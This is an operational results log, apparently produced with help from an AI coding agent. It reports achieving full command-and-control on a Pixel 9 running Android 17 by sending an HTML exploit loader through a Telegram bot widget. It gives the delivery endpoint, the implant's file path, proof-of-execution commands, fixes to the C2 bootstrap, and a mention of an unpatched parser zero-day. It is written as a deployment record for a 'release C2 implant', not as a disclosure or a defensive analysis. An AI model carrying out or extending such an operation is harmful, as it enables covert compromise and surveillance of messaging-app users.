# Pixel 9 / Android 17 — Bot API widget delivery + full C2 (2026-11-05)

## Result

Full C2 on the Pixel 9, Android 17, using the clean 3,056-byte (zlib) loader
delivered **directly by the bot**, with no Telegram DB injection.

- Delivery: Bot API 10.4 `sendWidget` on the **beta prefix**
  `POST https://api.telegram.org/beta/bot<token>/sendWidget`
  (`application/json`, fields `chat_id` + raw `html`).
  At the time of this run, the stable prefix returned `404 Not Found`.

  > Update 2026-11-08: the standard prefix now serves `sendWidget` natively
  > (HTTP 200, same shape). The 404 line is the 2026-11-05 measurement.
- Widget message: **5511** to `<TG_USERNAME>` / chat `<CHAT_ID>`.
- HTML: `poc/loader_v7_plain_text_cec.html`, 7,460 bytes raw, 3,056 bytes
  zlib-9, SHA-256 prefix `22c96d824e814f1b`; the Bot API response returns the
  HTML byte-identical.
- Bootstrap: the real release bootstrap, 39,346 bytes, served on 4445;
  device path `/data/user/0/org.telegram.messenger/files/.c2`.
- C2 session: `tg-10290-Pixel_9`, `uid=10290(u0_a290)`,
  SELinux `u:r:untrusted_app_34:s0`, Android 17, Pixel 9.
- Proof exec: `id; getprop ro.build.version.release; getprop
  ro.product.model; ls -la .../.c2; id` → `[exec rc=0 1.59s]`.
- Proof messages: **5512** (chat <CHAT_ID>), **5513** (chat <CHAT_ID>).

## Why the first Pixel attempts failed

Two separate harness problems, not device/MTE problems:

1. The C2 bootstrap was hardcoded for the beta package
   (`DEFAULT_APP=org.telegram.messenger.beta`); the Pixel runs release.
   Fixed by overriding `DEFAULT_APP` / `DEFAULT_DEVICE_DIR`.
2. A diagnostic-only instrumentation inserted `report "S4_SUP_START"` between
   the `C2_DIR="$D" ... \` line continuation and the `setsid supervisor.sh`
   call. The environment assignment then applied to `report`, the supervisor
   started with an empty `C2_DIR`, and exited with `supervisor: C2_DIR missing`.
   The unmodified production bootstrap does not have this bug.

Conclusion: Android 17 / Pixel 9 is fully compatible with the loader and the
release C2 implant. MTE active; the app did not crash.

> Confirmed 2026-11-07: MTE was enabled from **Developer Options** on the Pixel 9.
> The v7 full C2 (`tg-10290-Pixel_9`) ran with MTE on; this is the MTE-on
> reference. The v7 same-view/same-allocation primitive is MTE-safe; the parser
> 0day's linear cross-allocation OOB is not the same primitive.

## Evidence

- `evidence/c2_pixel_android17_proof.log`
- `evidence/sendwidget_test_5511.json`
- `/tmp/opencode/c2_pixel_real.log`
- `/tmp/opencode/sendwidget_test.log` (subagent Bot API matrix)
